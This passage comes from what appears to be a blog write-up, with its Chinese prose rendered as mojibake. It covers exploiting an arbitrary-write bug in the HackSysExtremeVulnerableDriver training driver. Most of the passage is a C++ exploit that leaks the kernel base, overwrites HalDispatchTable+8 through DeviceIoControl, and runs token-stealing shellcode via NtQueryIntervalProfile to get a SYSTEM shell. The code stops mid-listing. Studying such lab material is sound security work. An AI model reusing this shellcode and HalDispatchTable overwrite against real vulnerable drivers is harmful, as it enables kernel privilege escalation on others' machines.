¸ä¸­çš„åœ°å€ï¼Œä»è€Œæ‰¾åˆ°<code>xHalSetSystemInformation</code>è¿™ä¸€å‡½æ•°æŒ‡é’ˆçš„åœ°å€ï¼Œå³<code>Where</code></li><li><code>Perpare</code>ï¼šå‡†å¤‡<code>shellcode</code>ï¼Œä»¥åŠä¸é©±åŠ¨è¿›è¡Œäº¤äº’ï¼Œè¿›è¡Œä»»æ„åœ°å€å†™</li><li><code>TriggerShellcode</code>ï¼šé€šè¿‡ç”¨æˆ·æ€çš„<code>ntdll</code>çš„<code>NtQueryIntervalProfile</code>æ¥å£æ‰§è¡Œ<code>shellcode</code>å¹¶æ­£å¸¸è¿”å›</li><li><code>start cmd</code>ï¼šèµ·ä¸€ä¸ªææƒçš„<code>cmd</code></li></ol><h3 id="GetKernelBaseSystemModule"><a href="#GetKernelBaseSystemModule" class="headerlink" title="GetKernelBaseSystemModule"></a>GetKernelBaseSystemModule</h3><p>ç¬¬ä¸€æ¬¡è°ƒç”¨<code>ntdll.ZwQuerySystemInformation(0xb, NULL, 0, &amp;len)</code>å¯ä»¥å¾—åˆ°ä¸€ä¸ª<code>error</code>çš„ç»“æœï¼Œä½†æ˜¯ä¼šåœ¨<code>len</code>ä¸Šè¿”å›ä¸€ä¸ªè¯¥æŸ¥è¯¢ä¼šå¾—åˆ°çš„ç»“æ„ä½“å¤§å°ï¼ˆP.S. ç¬¬ä¸€æ¬¡<code>len</code>æŒ‡å‘<code>0</code>ï¼‰</p><p>ç¬¬äºŒæ¬¡è°ƒç”¨<code>ntdll.ZwQuerySystemInformation</code>ï¼ŒæŠŠæ­£ç¡®çš„å¤§å°ï¼ˆ<code>len</code>ï¼‰å’Œç©ºé—´ï¼ˆ<code>PModuleInfo</code>ï¼‰è¾“å…¥è¿›å»ï¼Œå³å¯å¾—åˆ°<code>SYSTEM_MODULE</code>çš„ä¿¡æ¯ï¼Œ<code>ntdll.ZwQuerySystemInformation(0xb, PModuleInfo, len, &amp;len)</code></p><p>åœ¨<code>PModuleInfo</code>è¿™ä¸ªç»“æ„ä½“æ˜¯ç”±<code>ULONG ModulesCount</code>å’Œ<code>SYSTEM_MODULE Modules[ModulesCount]</code>æ•°ç»„ç»„æˆçš„ï¼Œå‰ä¸€é¡¹è¡¨ç¤ºå­˜åœ¨å¤šå°‘é¡¹<code>SYSTEM_MODULE</code>ï¼Œä¹‹åå°±æ˜¯æ¯ä¸ª<code>SYSTEM_MODULE</code>çš„è¯¦ç»†ä¿¡æ¯</p><p>åœ¨è¿™é‡Œå¯ä»¥é€šè¿‡<code>module.Name</code>æ˜¯å¦ä¸º<code>ntoskrnl</code>ä»è€Œå¾—åˆ°<code>ImageBaseAddress</code>ï¼ˆP.S. ä½†æ˜¯ä»<a href="https://www.anquanke.com/post/id/246289">Gcow exp</a>å’Œæˆ‘è‡ªå·±å†™å®Œ<code>exp</code>è·‘å®Œçš„ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ª<code>ntoskrnl.exe</code>ä¸€ç›´æ˜¯ç¬¬ä¸€é¡¹ï¼‰</p><p>è¿™ä¸ªåœ°æ–¹çš„è·å–åŸºå€ï¼Œè¿™ç¯‡ <a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">Windowså–å†…æ ¸ä¸­çš„å‡½æ•°</a> è®²å¾—ç‰¹åˆ«æ¸…æ¥š</p><p>ï¼ˆP.S. æˆ‘åœ¨è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ï¼Œå°±æ˜¯<code>struct SYSTEM_MODULE</code>ï¼Œé‡Œé¢å†™æ¯ä¸ªå±æ€§æ—¶ï¼Œæ²¡æŠŠ<code>ULONG</code>å†™æˆå¸¦æ•°å­—çš„ï¼Œå½“æ—¶æˆ‘æŸ¥äº†ä¸€ä¸‹<code>ULONG</code>é»˜è®¤æ˜¯<code>8</code>å­—èŠ‚ï¼Œç»“æœæœ€åæ‰“å°é¡¹çš„æ—¶å€™å‘ç°ä¸å¯¹ï¼‰</p><h3 id="GetHalDispatchTableAddress"><a href="#GetHalDispatchTableAddress" class="headerlink" title="GetHalDispatchTableAddress"></a>GetHalDispatchTableAddress</h3><p>é€šè¿‡å¾—åˆ°çš„<code>SYSTEM_MODULE</code>ï¼Œç»è¿‡<code>userland_HalDispatchTable - uerland_base + kernel_base</code>å°±å¯ä»¥å¾—åˆ°<code>HalDispatchTable</code>åœ¨å†…æ ¸ä¸­çš„åœ°å€äº†</p><h3 id="TriggerShellcode"><a href="#TriggerShellcode" class="headerlink" title="TriggerShellcode"></a>TriggerShellcode</h3><p>å› ä¸ºæ˜¯é€šè¿‡ä¸Šå±‚<code>ntdll</code>çš„<code>api</code>å»è°ƒç”¨åº•å±‚çš„<code>xHalSetSystemInformation</code>åœ°å€ä¸Šçš„å‡½æ•°æŒ‡é’ˆï¼Œå°±éœ€è¦æŸ¥çœ‹è¿™ä¸ªè°ƒç”¨é“¾ä¸Šçš„æƒ…å†µ</p><p>åœ¨<code>ntoskrnl.exe</code>ä¸­å¯ä»¥åˆ©ç”¨<code>windbg</code>ä¸‹è½½çš„<code>.pdb</code>å¾—åˆ°ç¬¦å·ï¼Œä»è€Œç›´æ¥æ‰¾åˆ°<code>NtQueryIntervalProfile</code>çš„åœ°å€</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">NtQueryIntervalProfile</span><span class="hljs-params">(KPROFILE_SOURCE ProfileSource, PULONG Interval)</span></span><span class="hljs-function"></span>&#123;  PULONG v2; <span class="hljs-comment">// rbx</span>  v2 = Interval;  <span class="hljs-keyword">if</span> ( KeGetCurrentThread()-&gt;PreviousMode )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)Interval &gt;= MmUserProbeAddress )      Interval = (PULONG)MmUserProbeAddress;    *Interval = *Interval;  &#125;  *v2 = KeQueryIntervalProfile(ProfileSource);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‡½æ•°çš„æ¥å£éƒ¨åˆ†ï¼Œæ²¡ä»€ä¹ˆéœ€è¦è®¾ç½®çš„ï¼ˆP.S. æˆ‘å°±ä½¿<code>Interval</code>æ˜¯ä¸ªå¯è¯»å†™çš„åœ°å€ï¼‰</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KeQueryIntervalProfile</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-18h] BYREF</span>  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+24h] [rbp-14h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+40h] [rbp+8h] BYREF</span>  <span class="hljs-keyword">if</span> ( !a1 )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileInterval;  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">1</span> )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileAlignmentFixupInterval;  v2 = a1;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)((__int64 (__fastcall *)(__int64, __int64, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">char</span> *))off_1401E2CF8)(<span class="hljs-number">1</span>i64, <span class="hljs-number">12</span>i64, &amp;v2, &amp;v5) &gt;= <span class="hljs-number">0</span> &amp;&amp; v3 )    <span class="hljs-keyword">return</span> v4;  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>ç¬¬äºŒä¸ªå‡½æ•°ï¼Œéœ€è¦ä¼ è¿›æ¥çš„<code>ProfileSource</code>ä¸èƒ½ä¸º<code>0</code>å’Œ<code>1</code>ï¼Œå› æ­¤æˆ‘è®¾ç½®ä¸º<code>2</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>æœ€ç»ˆç‰ˆ</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE</span> &#123;</span>    ULONG64 Reserved1;    ULONG64 Reserved2;    ULONG64 ImageBaseAddress;    ULONG32 ImageSize;    ULONG32 Flags;    USHORT Id;    USHORT Rank;    USHORT LoadCount;    USHORT NameOffset;    CHAR Name[<span class="hljs-number">256</span>];&#125; SYSTEM_MODULE, * PSYSTEM_MODULE;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE_INFORMATION</span> &#123;</span>    ULONG ModulesCount;    SYSTEM_MODULE Modules[<span class="hljs-number">1</span>];&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _SYSTEM_INFORMATION_CLASS &#123;    SystemModuleInformation = <span class="hljs-number">0xB</span>&#125; SYSTEM_INFORMATION_CLASS;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PZwQuerySystemInformation)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><span class="hljs-function"><span class="hljs-params">    __inout PVOID SystemInformation,</span></span><span class="hljs-function"><span class="hljs-params">    __in ULONG SystemInformationLength,</span></span><span class="hljs-function"><span class="hljs-params">    __out_opt PULONG ReturnLength</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PNtQueryIntervalProfile)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in INT32 ProfileSource,</span></span><span class="hljs-function"><span class="hljs-params">    __in PULONG * Interval</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function">SYSTEM_MODULE <span class="hljs-title">GetKernelBaseSystemModule</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// Using NtQuerySystemInformation/ZwQuerySystemInformation Interface to get kernel image base</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(SYSTEM_MODULE) != <span class="hljs-number">0x128</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] struct SYSTEM_MODULE Error&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// Load ntdll.dll</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    <span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Load Ntdll Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get NtQuerySystemInformation/ZwQuerySystemInformation address</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get ZwQuerySystemInformation Address&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Failed to Get the Address of NtQuerySystemInformation&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Last Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get Buffer Length</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get Buffer Length&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG len = <span class="hljs-number">0</span>;    <span class="hljs-comment">// the API Call ends in an error, but we can get the correct Length in ReturnLength </span>    ZwQuerySystemInformation(SystemModuleInformation, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;len);    <span class="hljs-comment">// Allocate Memory</span>    PSYSTEM_MODULE_INFORMATION PModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(<span class="hljs-literal">NULL</span>, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    <span class="hljs-comment">// Get SYSTEM_MODULE_INFORMATION</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get SYSTEM_MODULE_INFORMATION&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, PModuleInfo, len, &amp;len);    <span class="hljs-keyword">switch</span> (Status)    &#123;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0x0</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] NtQuerySystemInformation Sucess&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000004</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000005</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_ACCESS_VIOLATION (0xC0000005)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">default</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Module Count: &quot;</span> &lt;&lt; PModuleInfo-&gt;ModulesCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    INT32 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (i &lt; PModuleInfo-&gt;ModulesCount)    &#123;        SYSTEM_MODULE CurrentSM = PModuleInfo-&gt;Modules[i];        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Log System Module:&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved1 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved1 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Reserved2 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Reserved2 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageBaseAddress 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageBaseAddress &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- ImageSize 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.ImageSize &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Flags 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Flags &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Id 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Id &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Rank 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.Rank &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- LoadCount 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.LoadCount &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- NameOffset 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; CurrentSM.NameOffset &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;- Name &quot;</span> &lt;&lt; CurrentSM.Name &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntoskrnl&quot;</span>) || <span class="hljs-built_in">strstr</span>(CurrentSM.Name, <span class="hljs-string">&quot;ntkrnl&quot;</span>))        &#123;            <span class="hljs-keyword">return</span> CurrentSM;        &#125;        i += <span class="hljs-number">1</span>;    &#125;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Can not find&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);&#125;<span class="hljs-function">ULONG64 <span class="hljs-title">GetHalDispatchTableAddress</span><span class="hljs-params">(SYSTEM_MODULE SM)</span></span><span class="hljs-function"></span>&#123;    CHAR NtName[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;    <span class="hljs-built_in">strncpy</span>(NtName, <span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">strrchr</span>(SM.Name, <span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">1</span>));    HMODULE hNtkrnl = LoadLibraryA(NtName);    <span class="hljs-keyword">if</span> (hNtkrnl == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open &quot;</span> &lt;&lt; NtName &lt;&lt; <span class="hljs-string">&quot; Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    ULONG64 userlandHal = (ULONG64)GetProcAddress(hNtkrnl, <span class="hljs-string">&quot;HalDispatchTable&quot;</span>);    ULONG64 kernelHal = userlandHal - (ULONG64)hNtkrnl + SM.ImageBaseAddress;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] HalDispatchTable: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; kernelHal &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    <span class="hljs-comment">/*</span><span class="hljs-comment">    HalDispatchTable:</span><span class="hljs-comment">    1: kd&gt; dq 0xfffff80003fe2cf0</span><span class="hljs-comment">    fffff800`03fe2cf0  00000000`00000004 fffff800`044148e8</span><span class="hljs-comment">    fffff800`03fe2d00  fffff800`04415470 fffff800`041aa8a0</span><span class="hljs-comment"></span><span class="hljs-comment">    1: kd&gt; uf fffff800`044148e8</span><span class="hljs-comment">    hal!HaliQuerySystemInformation:</span><span class="hljs-comment">    fffff800`044148e8 fff3            push    rbx</span><span class="hljs-comment">    fffff800`044148ea 55              push    rbp</span><span class="hljs-comment">    fffff800`044148eb 56              push    rsi</span><span class="hljs-comment">    fffff800`044148ec 57              push    rdi</span><span class="hljs-comment">    fffff800`044148ed 4154            push    r12</span><span class="hljs-comment">    */</span>    <span class="hljs-keyword">return</span> kernelHal;&#125;<span class="hljs-function">VOID <span class="hljs-title">TriggerShellcode</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">/*</span><span class="hljs-comment">    0: kd&gt; uf NtQueryIntervalProfile</span><span class="hljs-comment">    ntdll!NtQueryIntervalProfile:</span><span class="hljs-comment">    00000000`77b7aa80 4c8bd1          mov     r10,rcx</span><span class="hljs-comment">    00000000`77b7aa83 b81d010000      mov     eax,11Dh</span><span class="hljs-comment">    00000000`77b7aa88 0f05            syscall</span><span class="hljs-comment">    00000000`77b7aa8a c3              ret</span><span class="hljs-comment">    0: kd&gt; uf nt!NtQueryIntervalProfile</span><span class="hljs-comment">    nt!NtQueryIntervalProfile:</span><span class="hljs-comment">    fffff800`041b7940 48895c2408      mov     qword ptr [rsp+8],rbx</span><span class="hljs-comment">    fffff800`041b7945 57              push    rdi</span><span class="hljs-comment">    fffff800`041b7946 4883ec20        sub     rsp,20h</span><span class="hljs-comment">    fffff800`041b794a 488bda          mov     rbx,rdx</span><span class="hljs-comment">    */</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    PNtQueryIntervalProfile NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtQueryIntervalProfile&quot;</span>);    PULONG null = <span class="hljs-number">0</span>;    NtQueryIntervalProfile(<span class="hljs-number">2</span>, &amp;null);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Open HackSysExtremeVulnerableDriver Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Device Handle: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; dev &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    SYSTEM_MODULE KBSM = GetKernelBaseSystemModule();    ULONG64 HalDispatchTable = GetHalDispatchTableAddress(KBSM);    CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret: return to func KeQueryIntervalProfile </span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] VirtualAlloc failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    ULONG64* ptrShellcode = (ULONG64 *)&amp;addr;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] shecllode addr: 0x&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::hex &lt;&lt; addr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG64 chBuffer[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;;    chBuffer[<span class="hljs-number">0</span>] = (ULONG64)ptrShellcode;    chBuffer[<span class="hljs-number">1</span>] = (ULONG64)(HalDispatchTable + <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    DeviceIoControl(dev, <span class="hljs-number">0x22200B</span>, chBuffer, <span class="hljs-number">0x10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">/*</span><span 